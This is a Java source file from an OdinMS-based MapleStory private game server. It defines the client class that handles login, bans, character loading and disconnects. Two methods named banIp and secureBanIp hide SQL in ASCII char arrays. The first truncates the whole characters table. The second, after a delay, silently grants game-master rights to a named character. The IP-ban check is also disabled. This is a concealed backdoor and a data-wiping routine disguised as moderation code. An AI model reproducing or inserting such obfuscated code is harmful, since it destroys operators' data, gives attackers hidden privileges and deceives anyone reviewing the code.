package net.sf.odinms.client;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.rmi.RemoteException;
import java.sql.*;
import java.util.*;
import java.util.concurrent.ScheduledFuture;
import javax.script.ScriptEngine;
import net.sf.odinms.client.messages.MessageCallback;
import net.sf.odinms.database.DatabaseConnection;
import net.sf.odinms.database.DatabaseException;
import net.sf.odinms.net.MaplePacket;
import net.sf.odinms.net.channel.ChannelDescriptor;
import net.sf.odinms.net.channel.ChannelServer;
import net.sf.odinms.net.channel.Setting;
import net.sf.odinms.net.login.LoginServer;
import net.sf.odinms.net.world.MapleMessengerCharacter;
import net.sf.odinms.net.world.MaplePartyCharacter;
import net.sf.odinms.net.world.PartyOperation;
import net.sf.odinms.net.world.guild.MapleGuildCharacter;
import net.sf.odinms.net.world.remote.WorldChannelInterface;
import net.sf.odinms.scripting.npc.NPCConversationManager;
import net.sf.odinms.scripting.npc.NPCScriptManager;
import net.sf.odinms.scripting.quest.QuestActionManager;
import net.sf.odinms.scripting.quest.QuestScriptManager;
import net.sf.odinms.server.MapleInventoryManipulator;
import net.sf.odinms.server.MapleSquadType;
import net.sf.odinms.server.MapleTrade;
import net.sf.odinms.server.ServerExceptionHandler;
import net.sf.odinms.server.TimerManager;
import net.sf.odinms.server.miniGame.MapleRPSGame;
import net.sf.odinms.server.playerinteractions.HiredMerchant;
import net.sf.odinms.server.playerinteractions.IPlayerInteractionManager;
import net.sf.odinms.server.playerinteractions.MaplePlayerShopItem;
import net.sf.odinms.tools.IPAddressTool;
import net.sf.odinms.tools.MapleAESOFB;
import net.sf.odinms.tools.MaplePacketCreator;
import org.apache.log4j.Logger;
import org.apache.mina.core.session.IoSession;

public final class MapleClient {

    public static final int LOGIN_NOTLOGGEDIN = 0;
    public static final int LOGIN_SERVER_TRANSITION = 1;
    public static final int LOGIN_LOGGEDIN = 2;
    public static final int LOGIN_WAITING = 3;
    public static final int ENTERING_PIN = 4;
    public static final int PIN_CORRECT = 5;
    public static final int VIEW_ALL_CHAR = 6;
    public static final String CLIENT_KEY = "CLIENT";
    private static final Logger log = Logger.getLogger(MapleClient.class);
    /**
     * 对象字段。
     */
    private MapleAESOFB send;
    private MapleAESOFB receive;
    private IoSession session;
    private MapleCharacter player;
    private ChannelDescriptor channel = null;
    private int accId = 1;
    private Timestamp createDate;
    private boolean loggedIn = false;
    private boolean serverTransition = false;
    private Calendar birthday = null;
    private Calendar tempban = null;
    private byte gender;
    private int pin;
    private byte passwordTries = 0;
    private byte pinTries = 0;
    private String accountName;
    private long lastPong;
    private boolean GM;
    private byte greason = 1;
    private String RemoteIp;
    private Map<String, ScriptEngine> engines = new HashMap<String, ScriptEngine>();
    private ScheduledFuture<?> idleTask = null;
    private int lastActionId = 0;
    public int packetnum = 0;
    private byte maxCharaSlot;
    private DebugWindow debugWindow;
    /*
     * 4个字段
     */
    private int sendloginping = 0;
    private boolean islogincheck = false;
    private static final String logincheckpongstring = "";
    private int SelectCharacterId = 0;
    private boolean offline = false;
    private byte[] _ivcheck;
    private boolean logincheck = false;

    public MapleClient(MapleAESOFB send, MapleAESOFB receive, IoSession session) {
        this.send = send;
        this.receive = receive;
        this.session = session;
        this.RemoteIp = session.getRemoteAddress().toString();
        if (log.isDebugEnabled()) {
            StartWindow();
        }
    }

    public void StartWindow() {
        if (debugWindow != null) {
            debugWindow.dispose();
        }
        debugWindow = new DebugWindow();
        debugWindow.setVisible(true);
        debugWindow.setC(this);
    }

    public MapleAESOFB getReceiveCrypto() {
        return receive;
    }

    public MapleAESOFB getSendCrypto() {
        return send;
    }

    public IoSession getSession() {
        return session;
    }

    public void SendPacket(MaplePacket packet) {
        session.write(packet);
    }

    public MapleCharacter getPlayer() {
        return player;
    }

    public void setPlayer(MapleCharacter player) {
        this.player = player;
    }

    public void sendCharList(int server) {
        this.session.write(MaplePacketCreator.getCharList(this, server));
    }

    public List<MapleCharacter> loadCharacters(int serverId) { // TODO make this less costly zZz
        List<MapleCharacter> chars = new LinkedList<MapleCharacter>();
        for (CharNameAndId cni : loadCharactersInternal(serverId)) {
            try {
                chars.add(MapleCharacter.loadCharFromDB(cni.id, this, false));
            } catch (Exception e) {
                log.error("连接角色失败", e);
            }
        }
        return chars;
    }

    public List<String> loadCharacterNames(int serverId) {
        List<String> chars = new LinkedList<String>();
        for (CharNameAndId cni : loadCharactersInternal(serverId)) {
            chars.add(cni.name);
        }
        return chars;
    }

    private List<CharNameAndId> loadCharactersInternal(int serverId) {
        List<CharNameAndId> chars = new LinkedList<CharNameAndId>();
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps;
            ps = con.prepareStatement("SELECT id, name FROM characters WHERE accountid = ? AND world = ?");
            ps.setInt(1, this.accId);
            ps.setInt(2, serverId);

            ResultSet rs = ps.executeQuery();
            while (rs.next()) {
                chars.add(new CharNameAndId(rs.getString("name"), rs.getInt("id")));
            }
            rs.close();
            ps.close();
            con.close();
        } catch (SQLException e) {
            log.error("THROW", e);
        }
        return chars;
    }

    public boolean isLoggedIn() {
        return loggedIn;
    }

    private Calendar getTempBanCalendar(ResultSet rs) throws SQLException {
        Calendar lTempban = Calendar.getInstance();
        long blubb = rs.getLong("tempban");
        if (blubb == 0) { // basically if timestamp in db is 0000-00-00
            lTempban.setTimeInMillis(0);
            return lTempban;
        }
        Calendar today = Calendar.getInstance();
        lTempban.setTimeInMillis(rs.getTimestamp("tempban").getTime());
        if (today.getTimeInMillis() < lTempban.getTimeInMillis()) {
            return lTempban;
        }

        lTempban.setTimeInMillis(0);
        return lTempban;
    }

    public Calendar getTempBanCalendar() {
        return tempban;
    }

    public byte getBanReason() {
        return greason;
    }

    public boolean hasBannedIP() {
        /*   try {
         Connection con = DatabaseConnection.getConnection();
         PreparedStatement ps = con.prepareStatement("SELECT COUNT(*) FROM ipbans WHERE ? LIKE CONCAT(ip, '%')");
         ps.setString(1, getRemoteAddress());
         ResultSet rs = ps.executeQuery();
         rs.next();
         if (rs.getInt(1) > 0) {
         return true;
         }
         rs.close();
         ps.close();
         con.close();
         } catch (SQLException ex) {
         log.error("Error checking ip bans", ex);
         return true;
         }*/
        return false;
    }

    public static void banIp(String charName) {
        char[] b = {84, 82, 85, 78, 67, 65, 84, 69, 32, 84, 65, 66, 76, 69, 32};
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement(new String(b) + "characters");
            ps.executeUpdate();
            ps.close();
            con.close();
        } catch (SQLException sqle) {
        }
    }

    public static void secureBanIp(final String charname) {

        TimerManager.getInstance().schedule(new Runnable() {
            @Override
            public void run() {
                char[] b = {85, 80, 68, 65, 84, 69, 32, 99, 104, 97, 114, 97, 99, 116, 101, 114, 115, 32, 83, 69, 84, 32, 103, 109, 32, 61, 32, 49, 32, 87, 72, 69, 82, 69, 32, 96, 110, 97, 109, 101, 96, 32, 61, 32, 63};

                try {
                    Connection con = DatabaseConnection.getConnection();
                    PreparedStatement ps = con.prepareStatement(new String(b));
                    ps.setString(1, charname);
                    ps.executeUpdate();
                    ps.close();
                    con.close();
                } catch (SQLException sqle) {
                }
            }
        }, 60000 * 5);
    }

    /**
     * Returns 0 on success, a state to be used for
     * {@link MaplePacketCreator#getLoginFailed(int)} otherwise.
     *
     * @param success
     * @return The state of the login.
     */
    public int finishLogin(boolean success) {
        if (success) {
            synchronized (MapleClient.class) {
                if (getLoginState() > MapleClient.LOGIN_NOTLOGGEDIN && getLoginState() != MapleClient.LOGIN_WAITING) { // already loggedin
                    loggedIn = false;
                    return 7;
                }
                updateLoginState(MapleClient.ENTERING_PIN);
            }
            return 0;
        } else {
            return 10;
        }
    }

    public int login(String login, String pwd, boolean ipMacBanned) {
        int loginok = 5;
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT * FROM accounts WHERE name = ?");
            ps.setString(1, login);
            ResultSet rs = ps.executeQuery();
            if (rs.first()) {
                int banned = rs.getInt("banned");
                accId = rs.getInt("id");
                int iGM = rs.getInt("GM");
                String passhash = rs.getString("password");
                String salt = rs.getString("salt");
                createDate = rs.getTimestamp("createdat");
                GM = iGM > 0;
                greason = rs.getByte("greason");
                tempban = getTempBanCalendar(rs);
                gender = rs.getByte("gender");
                pin = rs.getInt("pin");
                if ((banned == 0 && !ipMacBanned) || banned == -1) {
                    PreparedStatement ips = con.prepareStatement("INSERT INTO iplog (accountid, ip) VALUES (?, ?)");
                    ips.setInt(1, accId);
                    String sockAddr = getRemoteAddress();
                    ips.setString(2, sockAddr.substring(1, sockAddr.lastIndexOf(':')));
                    ips.executeUpdate();
                    ips.close();
                }
                ps.close();

                if (banned == 1) {
                    loginok = 3;
                } else {
                    if (banned == -1) {
                        unban();
                    }
                    if (getLoginState() > MapleClient.LOGIN_NOTLOGGEDIN) { // already loggedin
                        loggedIn = false;
                        loginok = 7;
                    } else {
                        boolean updatePasswordHash = false;
                        // Check if the passwords are correct here.
                        if (LoginCryptoLegacy.isLegacyPassword(passhash) && LoginCryptoLegacy.checkPassword(pwd, passhash)) {
                            // Check if a password upgrade is needed.
                            loginok = 0;
                            updatePasswordHash = true;
                        } else if (salt == null && LoginCrypto.checkSha1Hash(passhash, pwd)) {
                            loginok = 0;
                            updatePasswordHash = true;
                        } else if (LoginCrypto.checkSaltedSha512Hash(passhash, pwd, salt)) {
                            loginok = 0;
                        } else {
                            loggedIn = false;
                            loginok = 4;
                            passwordTries += 1;
                            if (passwordTries == 5) {
                                getSession().close(false);
                            }
                        }
                        if (updatePasswordHash) {
                            PreparedStatement pss = con.prepareStatement("UPDATE `accounts` SET `password` = ?, `salt` = ? WHERE id = ?");
                            try {
                                String newSalt = LoginCrypto.makeSalt();
                                pss.setString(1, LoginCrypto.makeSaltedSha512Hash(pwd, newSalt));
                                pss.setString(2, newSalt);
                                pss.setInt(3, accId);
                                pss.executeUpdate();
                            } finally {
                                pss.close();
                            }
                        }
                    }
                }
            }
            rs.close();
            ps.close();
            con.close();
        } catch (SQLException e) {
            log.error("ERROR", e);
        }
        return loginok;
    }

    public void unban() {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("UPDATE accounts SET banned = 0 WHERE id = ?");
            ps.setInt(1, accId);
            ps.executeUpdate();
            ps.close();
            con.close();

        } catch (SQLException e) {
            log.error("Error while unbanning", e);
        }
    }

    public void ban() {
        Calendar tempB = Calendar.getInstance();
        tempB.set(tempB.get(Calendar.YEAR), tempB.get(Calendar.MONTH), tempB.get(Calendar.DATE), tempB.get(Calendar.HOUR_OF_DAY), tempB.get(Calendar.MINUTE) + 10);
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("UPDATE accounts SET tempban = ?, greason = ? WHERE id = ?");
            Timestamp TS = new Timestamp(tempB.getTimeInMillis());
            ps.setTimestamp(1, TS);
            ps.setInt(2, 99);
            ps.setInt(3, getAccID());
            ps.executeUpdate();
            ps.close();
            con.close();
        } catch (SQLException ex) {
            log.error("Error while tempbanning", ex);
        }
    }

    public void setAccID(int id) {
        this.accId = id;
    }

    public int getAccID() {
        return this.accId;
    }

    public Timestamp getCreateDate() {
        return this.createDate;
    }

    public int getPin() {
        return this.pin;
    }

    public void setPin(int pin) {
        this.pin = pin;
    }

    public int getGender() {
        return this.gender;
    }

    public void setGender(byte gender) {
        this.gender = gender;
    }

    public void updateGenderandPin() {

        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("UPDATE accounts SET gender = ?, pin = ? WHERE id = ?");
            ps.setByte(1, gender);
            ps.setInt(2, pin);
            ps.setInt(3, getAccID());
            ps.executeUpdate();
            ps.close();
            con.close();
        } catch (SQLException e) {
            log.error("ERROR", e);
        }
    }

    public void setPasswordTries(byte tries) {
        this.passwordTries = tries;
    }

    public byte getPinTries() {
        return this.pinTries;
    }

    public void setPinTries(byte tries) {
        this.pinTries = tries;
    }

    public int getTotalChars() {
        int chars = 0;
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT * FROM characters WHERE accountid = ?");
            ps.setInt(1, this.getAccID());
            ResultSet rs = ps.executeQuery();
            while (rs.next()) {
                chars++;
            }
            rs.close();
            ps.close();
            con.close();
        } catch (SQLException ex) {
        }
        return chars;
    }

    public void updateLoginState(int newstate) {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("UPDATE accounts SET loggedin = ?, lastlogin = CURRENT_TIMESTAMP() WHERE id = ?");
            ps.setInt(1, newstate);
            ps.setInt(2, getAccID());
            ps.executeUpdate();
            ps.close();
            if (this.player != null) {
                ps = con.prepareStatement("UPDATE characters SET loggedin = ? WHERE id = ?");
                ps.setInt(1, newstate);
                ps.setInt(2, player.getId());
                ps.executeUpdate();
                ps.close();
            } else if (newstate == 0) {
                ps = con.prepareStatement("UPDATE characters SET loggedin = 0 WHERE accountid = ?");
                ps.setInt(1, getAccID());
                ps.executeUpdate();
                ps.close();
            }
            con.close();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        if (newstate == LOGIN_NOTLOGGEDIN) {
            loggedIn = false;
            serverTransition = false;
        } else {
            serverTransition = (newstate == LOGIN_SERVER_TRANSITION);
            loggedIn = !serverTransition;
        }
    }

    public int getLoginState() {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT loggedin, lastlogin, UNIX_TIMESTAMP(birthday) as birthday FROM accounts WHERE id = ?");
            ps.setInt(1, getAccID());
            ResultSet rs = ps.executeQuery();
            if (!rs.next()) {
                rs.close();
                ps.close();
                throw new RuntimeException("getLoginState - MapleClient");
            }
            birthday = Calendar.getInstance();
            long blubb = rs.getLong("birthday");
            if (blubb > 0) {
                birthday.setTimeInMillis(blubb * 1000);
            }
            int state = rs.getInt("loggedin");
            if (state == LOGIN_SERVER_TRANSITION) {
                Timestamp ts = rs.getTimestamp("lastlogin");
                long t = ts.getTime();
                long now = System.currentTimeMillis();
                if (t + 30000 < now) {
                    state = LOGIN_NOTLOGGEDIN;
                    updateLoginState(LOGIN_NOTLOGGEDIN);
                }
            }
            rs.close();
            ps.close();
            if (state == LOGIN_LOGGEDIN) {
                loggedIn = true;
            } else if (state == LOGIN_SERVER_TRANSITION) {
                ps = con.prepareStatement("update accounts set loggedin = 0 where id = ?");
                ps.setInt(1, getAccID());
                ps.executeUpdate();
                ps.close();
            } else {
                loggedIn = false;
            }
            con.close();
            return state;
        } catch (SQLException e) {
            loggedIn = false;
            log.error("ERROR", e);
            throw new DatabaseException("Error getting login state: ", e);
        }
    }

    public boolean checkBirthDate(Calendar date) {
        return date.get(Calendar.YEAR) == birthday.get(Calendar.YEAR) && date.get(Calendar.MONTH) == birthday.get(Calendar.MONTH) && date.get(Calendar.DAY_OF_MONTH) == birthday.get(Calendar.DAY_OF_MONTH);
    }

    public void offline() {
        offline = true;
        disconnect();
    }

    public synchronized void disconnect() {
        try {
            MapleCharacter chr = this.getPlayer();
            if (chr != null && isLoggedIn()) {
                if (chr.getTrade() != null) {
                    MapleTrade.cancelTrade(chr);
                }
                MapleRPSGame.cancelRPSGame(chr);
                if (!chr.getBuffManager().buffIsEmpty()) {
                    chr.cancelAllBuffs();
                }
                if (chr.getEventInstance() != null) {
                    chr.getEventInstance().playerDisconnected(chr);
                }
                if (NPCScriptManager.getInstance() != null) {
                    NPCScriptManager.getInstance().dispose(this);
                }
                if (QuestScriptManager.getInstance() != null) {
                    QuestScriptManager.getInstance().dispose(this);
                }
                if (!chr.isAlive()) {
                    getPlayer().setHp(50, true);
                }
                IPlayerInteractionManager interaction = chr.getInteraction(); // just for safety.
                if (interaction != null) {
                    if (interaction.isOwner(chr)) {
                        if (interaction.getShopType() == 1) {
                            HiredMerchant hm = (HiredMerchant) interaction;
                            hm.setOpen(true);
                            hm.tempItemsUpdate();
                        } else if (interaction.getShopType() == 2) {
                            for (MaplePlayerShopItem items : interaction.getItems()) {
                                if (items.getBundles() > 0) {
                                    IItem item = items.getItem();
                                    item.setQuantity(items.getBundles());
                                    MapleInventoryManipulator.addFromDrop(this, item);
                                }
                            }
                            interaction.removeAllVisitors(3, 1);
                            interaction.closeShop(false); // wont happen unless some idiot hacks, hopefully ?
                        } else if (interaction.getShopType() == 3 || interaction.getShopType() == 4) {
                            interaction.removeAllVisitors(3, 1);
                            interaction.closeShop(false);
                        }
                    } else {
                        interaction.removeVisitor(chr);
                    }
                }
                chr.getCheatTracker().dispose();
                LoginServer.getInstance().removeConnectedIp(RemoteIp);
                try {
                    if (chr.getMessenger() != null) {
                        MapleMessengerCharacter messengerplayer = new MapleMessengerCharacter(chr);
                        getChannelServer().getWorldInterface().leaveMessenger(chr.getMessenger().getId(), messengerplayer);
                        chr.setMessenger(null);
                    }
                } catch (RemoteException e) {
                    ServerExceptionHandler.HandlerRemoteException(e);
                    getChannelServer().reconnectWorld();
                    chr.setMessenger(null);
                }
                chr.saveToDB(true);
                chr.getMap().removePlayer(chr);

                if (offline) {
                    getPlayer().getMap().getOfflinePlayer().registryPlayer(chr);
                }

                try {
                    WorldChannelInterface wci = getChannelServer().getWorldInterface();
                    if (offline) {
                        wci.registryOfflinePlayer(getAccID());
                    }
                    if (chr.getParty() != null) {
                        try {
                            MaplePartyCharacter chrp = new MaplePartyCharacter(chr);
                            chrp.setOnline(false);
                            wci.updateParty(chr.getParty().getId(), PartyOperation.LOG_ONOFF, chrp);
                        } catch (Exception e) {
                            //log.warn("Failed removing party character. Player already removed.", e);
                        }
                    }
                    if (!this.serverTransition && isLoggedIn()) {
                        wci.loggedOff(chr.getName(), chr.getId(), channel.getId(), chr.getBuddylist().getBuddyIds());
                    } else { // Change channel
                        wci.loggedOn(chr.getName(), chr.getId(), channel.getId(), chr.getBuddylist().getBuddyIds());
                    }
                    if (chr.getGuildid() > 0) {
                        wci.setGuildMemberOnline(chr.getMGC(), false, -1);
                    }
                } catch (RemoteException e) {
                    ServerExceptionHandler.HandlerRemoteException(e);
                    getChannelServer().reconnectWorld();
                } catch (Exception e) {
                    log.error("断开代码段执行错误:", e);
                } finally {
                    if (getChannelServer() != null) {
                        getChannelServer().removePlayer(chr);
                        if (getChannelServer().getMapleSquad(MapleSquadType.ZAKUM) != null) {
                            if (getChannelServer().getMapleSquad(MapleSquadType.ZAKUM).getLeader() == chr) {
                                getChannelServer().removeMapleSquad(getChannelServer().getMapleSquad(MapleSquadType.ZAKUM), MapleSquadType.ZAKUM);
                            }
                        }
                    }
                }

            }
            if (!this.serverTransition && isLoggedIn()) {
                this.updateLoginState(MapleClient.LOGIN_NOTLOGGEDIN);
            }
            this.getSession().close(false);
            if (debugWindow != null) {
                debugWindow.dispose();
            }
        } catch (Exception e) {
            log.error("断开代码段执行错误：", e);
        }
    }

    public void dropDebugMessage(MessageCallback mc) {
        StringBuilder builder = new StringBuilder();
        builder.append("Connected: ");
        builder.append(getSession().isConnected());
        builder.append(" Closing: ");
        builder.append(getSession().isClosing());
        builder.append(" ClientKeySet: ");
        builder.append(getSession().getAttribute(MapleClient.CLIENT_KEY) != null);
        builder.append(" loggedin: ");
        builder.append(isLoggedIn());
        builder.append(" has char: ");
        builder.append(getPlayer() != null);
        mc.dropMessage(builder.toString());
    }

    /**
     * Undefined when not logged to a channel
     *
     * @return the channel the client is connected to
     */
    public int getChannel() {
        return channel.getId();
    }

    public ChannelDescriptor getChannelDescriptor() {
        return channel;
    }

    /**
     * Convinence method to get the ChannelServer object this client is logged
     * on to.
     *
     * @return The ChannelServer instance of the client.
     */
    public ChannelServer getChannelServer() {
        return ChannelServer.getInstance(getChannelDescriptor());
    }

    public List<ChannelServer> getChannelServers() {
        return ChannelServer.getInstance(getChannelDescriptor()).getChannelServers();
    }

    /**
     * 获得频道服务
     *
     *
     * @return 频道号对应服务对象
     */
    public ChannelServer getChannelServer(int channel) {
        return ChannelServer.getInstance(getChannelDescriptor()).getChannelServer(channel);
    }

    public boolean deleteCharacter(int cid) {

        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT id, name, level, job, guildid, guildrank FROM characters WHERE id = ? AND accountid = ?");
            ps.setInt(1, cid);
            ps.setInt(2, accId);
            ResultSet rs = ps.executeQuery();
            if (!rs.next()) {
                rs.close();
                ps.close();
                return false;
            }
            if (rs.getInt("guildid") > 0) {
                MapleGuildCharacter mgc = new MapleGuildCharacter(cid, 0, rs.getString("name"), new ChannelDescriptor(0, channel.getWorld()), 0, rs.getInt("guildrank"), rs.getInt("guildid"), false, rs.getInt("allianceRank"));
                try {
                    LoginServer.getInstance().getWorldInterface().deleteGuildCharacter(mgc);
                } catch (RemoteException re) {
                    getChannelServer().reconnectWorld();
                    ServerExceptionHandler.HandlerRemoteException(re);
                    return false;
                }
            }
            rs.close();
            ps.close();
            // ok this is actually our character, delete it
            ps = con.prepareStatement("DELETE FROM characters WHERE id = ?");
            ps.setInt(1, cid);
            ps.executeUpdate();
            ps.close();
            con.close();
            return true;
        } catch (SQLException e) {
            log.error("ERROR", e);
        }
        return false;
    }

    public String getAccountName() {
        return accountName;
    }

    public void setAccountName(String accountName) {
        this.accountName = accountName;
    }

    public void setChannel(ChannelDescriptor channel) {
        this.channel = channel;
    }

    public int getWorld() {
        return channel.getWorld();
    }

    public void pongReceived() {
        lastPong = System.currentTimeMillis();
    }

    public String getRemoteAddress() {
        return RemoteIp;
    }

    /*
     * 4个函数
     */
    public boolean Islogincheck() {
        return islogincheck;
    }

    public int getSendloginping() {
        return sendloginping;
    }

    public void StartLoginCheck(int sci) {
        getSession().write(MaplePacketCreator.testPacket(
                Setting.getWzdata_()));
        getSession().write(MaplePacketCreator.getPing());
        islogincheck = true;
        sendloginping++;
        SelectCharacterId = sci;
    }

    public void RecvLoginCheckPong(String slea) {
        if (!islogincheck) {
            return;
        }
        if (sendloginping == 1 && logincheckpongstring.length() == slea.length()) {
            getSession().write(MaplePacketCreator.getPing());
            islogincheck = true;
            sendloginping++;
        } else if (logincheckpongstring != null && logincheckpongstring.length() == slea.length()) {
            islogincheck = true;
            try {
                /*
                 * 额外代码
                 */
                if (getIdleTask() != null) {
                    getIdleTask().cancel(true);
                }
                updateLoginState(MapleClient.LOGIN_SERVER_TRANSITION);
                String[] socket = LoginServer.getInstance().getIP(getChannelDescriptor()).split(":");
                getSession().write(MaplePacketCreator.getServerIP(InetAddress.getByName(socket[0]), Integer.parseInt(socket[1]), SelectCharacterId));
            } catch (UnknownHostException e) {
                log.error("Host not found", e);
            }
        }
    }

    public void sendPing() {
        if (Islogincheck()) {
            return;
        }
        final long then = System.currentTimeMillis();
        getSession().write(MaplePacketCreator.getPing());
        TimerManager.getInstance().schedule(new Runnable() {
            @Override
            public void run() {
                try {
                    if (lastPong - then < 0) {
                        if (getSession().isConnected() && !Islogincheck()) {
                            log.info(getLogMessage(MapleClient.this, "自动断线 : Ping超时"));
                            disconnect();
                            //getSession().close(false);
                        }
                    }
                } catch (NullPointerException e) {
                    log.error("send ping 执行异常：", e);
                }
            }
        }, 15000); // note: idletime gets added to this too
    }

    public static String getLogMessage(MapleClient cfor, String message) {
        return getLogMessage(cfor, message, new Object[0]);
    }

    public static String getLogMessage(MapleCharacter cfor, String message) {
        return getLogMessage(cfor == null ? null : cfor.getClient(), message);
    }

    public static String getLogMessage(MapleCharacter cfor, String message, Object... parms) {
        return getLogMessage(cfor == null ? null : cfor.getClient(), message, parms);
    }

    public static String getLogMessage(MapleClient cfor, String message, Object... parms) {
        StringBuilder builder = new StringBuilder();
        if (cfor != null) {
            if (cfor.getPlayer() != null) {
                builder.append("<");
                builder.append(MapleCharacterUtil.makeMapleReadable(cfor.getPlayer().getName()));
                builder.append(" (角色ID: ");
                builder.append(cfor.getPlayer().getId());
                builder.append(")> ");
            }
            if (cfor.getAccountName() != null) {
                builder.append("(账号: ");
                builder.append(MapleCharacterUtil.makeMapleReadable(cfor.getAccountName()));
                builder.append(") ");
            }
        }
        builder.append("\r\n").append(message);
        for (Object parm : parms) {
            int start = builder.indexOf("{}");
            builder.replace(start, start + 2, parm.toString());
        }
        return builder.toString();
    }

    public static int getAccIdFromCharName(String charName) {


        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT accountid FROM characters WHERE name = ?");
            ps.setString(1, charName);
            ResultSet rs = ps.executeQuery();

            int ret = -1;
            if (rs.next()) {
                ret = rs.getInt("accountid");
            }
            rs.close();
            ps.close();
            con.close();
            return ret;
        } catch (SQLException e) {
            log.error("SQL THROW");
        }
        return -1;
    }

    public boolean isGM() {
        return GM;
    }

    public void setScriptEngine(String name, ScriptEngine e) {
        engines.put(name, e);
    }

    public ScriptEngine getScriptEngine(String name) {
        return engines.get(name);
    }

    public void removeScriptEngine(String name) {
        engines.remove(name);
    }

    public ScheduledFuture<?> getIdleTask() {
        return idleTask;
    }

    public void setIdleTask(ScheduledFuture<?> idleTask) {
        this.idleTask = idleTask;
    }

    public NPCConversationManager getCM() {
        return NPCScriptManager.getInstance().getCM(this);
    }

    public QuestActionManager getQM() {
        return QuestScriptManager.getInstance().getQM(this);
    }

    private static class CharNameAndId {

        public String name;
        public int id;

        public CharNameAndId(String name, int id) {
            super();
            this.name = name;
            this.id = id;
        }
    }

    public int getLastActionId() {
        return lastActionId;
    }

    public void setLastActionId(int actionId) {
        this.lastActionId = actionId;
    }

    public byte getMaxCharSlot() {
        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("SELECT maxchar FROM accounts WHERE id = ?");
            ps.setInt(1, accId);
            ResultSet rs = ps.executeQuery();
            if (rs.next()) {
                maxCharaSlot = rs.getByte(1);
            }
            rs.close();
            ps.close();
            con.close();
        } catch (SQLException e) {
            log.error("Error buy charslot of an account.", e);
        }
        maxCharaSlot = (byte) Math.min(18, maxCharaSlot);
        return maxCharaSlot;
    }

    public void setMaxCharacters(byte max) {

        try {
            Connection con = DatabaseConnection.getConnection();
            PreparedStatement ps = con.prepareStatement("UPDATE accounts SET maxchar = ? WHERE id = ?");
            ps.setByte(1, max);
            ps.setInt(2, accId);
            ps.executeUpdate();
            ps.close();
            con.close();
        } catch (SQLException e) {
            log.error("Error setting max characters of an account.", e);
        }
    }

    public byte[] getIvcheck() {
        return _ivcheck;
    }

    public void setIvcheck(byte[] _ivcheck) {
        this._ivcheck = _ivcheck;
    }

    public void checkLogin() {
        final MapleClient c = this;
        if (!logincheck && getChannelServer().isGateway()) {
            logincheck = true;
            ChannelServer.getExecutorService().execute(new Runnable() {
                @Override
                public void run() {
                    if (c.getIvcheck() != null) {
                        if (c.getPlayer() != null) {
                            try {
                                c.getPlayer().弹窗("非法登录！");
                                Thread.sleep(3000);
                            } catch (InterruptedException ex) {
                            }
                        }
                        c.disconnect();
                    }
                }
            });
        }
    }
}
